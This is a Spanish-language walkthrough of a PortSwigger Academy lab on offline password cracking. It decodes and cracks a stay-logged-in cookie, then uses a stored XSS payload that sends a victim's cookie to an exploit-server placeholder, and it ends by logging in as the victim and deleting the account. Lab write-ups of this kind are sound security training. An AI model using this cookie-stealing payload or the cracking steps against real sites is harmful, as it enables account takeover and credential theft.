---
title: "10 Offline password cracking"
collection: publications
category: portswigger
permalink: publications/Authentication/10_Offline password cracking
excerpt: 'Este laboratorio permite a los usuarios permanecer conectados incluso después de cerrar la sesión del navegador. La cookie utilizada para proporcionar esta funcionalidad es vulnerable a la fuerza bruta.'
date: 2024-12-06
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'Offline password cracking'
---

![logo]({{site.url}}/images/Authentication/authentication-lab-10/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/Authentication/authentication-lab-10/descripcion.png)

## Objetivo del laboratorio

 A continuación, inicia sesión como Carlos y elimina su cuenta desde la página `My account page`.

## Analisis

Probamos la autenticación con un usuario valido con el cual tengamos las credenciales y vemos el proceso de login desde el BurpSuite.

![login]({{site.url}}/images/Authentication/authentication-lab-10/login.png)

Vemos que hay una cadena que podemos descrifrar

![Analisis]({{site.url}}/images/Authentication/authentication-lab-10/analisis.png)

Decodificamos en `Base64`

![base64]({{site.url}}/images/Authentication/authentication-lab-10/base64.png)

Usamos la herramienta web `CrackStatio` para crackear el password, vemos que es `peter`

![hash]({{site.url}}/images/Authentication/authentication-lab-10/hash.png)

## Vulnerabilidad XSS

Esta web es vulnerable a XSS asi que se va a simular el robo de credenciales, simulando que un usuario `carlos` ingresa las credenciales.  Con este metodo vamos a robar la cookie.

```javascript
<script>document.location='EXPLOIT'+document.cookie</script>
```

![XSS]({{site.url}}/images/Authentication/authentication-lab-10/xss.png)

Aqui obtuvimos el servidor

![server]({{site.url}}/images/Authentication/authentication-lab-10/server.png)

Revisamos el log, vemos que un usuario a ingresado sus credenciales y obtuvimos una cookie

![cookie]({{site.url}}/images/Authentication/authentication-lab-10/cookie.png)

Vemos que hay un String y la decodificamos.

![decode2]({{site.url}}/images/Authentication/authentication-lab-10/decode2.png)

Usamos la herramienta web `CrackStatio` para crackear el password, vemos que es `onceuponatime`

![Hash2]({{site.url}}/images/Authentication/authentication-lab-10/hash2.png)

## Login

![login2]({{site.url}}/images/Authentication/authentication-lab-10/login2.png)

Procedemos a borar la cuenta

![Borar]({{site.url}}/images/Authentication/authentication-lab-10/borrar.png)

Nos confima si queremos

![Seguro]({{site.url}}/images/Authentication/authentication-lab-10/seguro.png)

## Aprobado

![Aprobado]({{site.url}}/images/Authentication/authentication-lab-10/aprobado.png)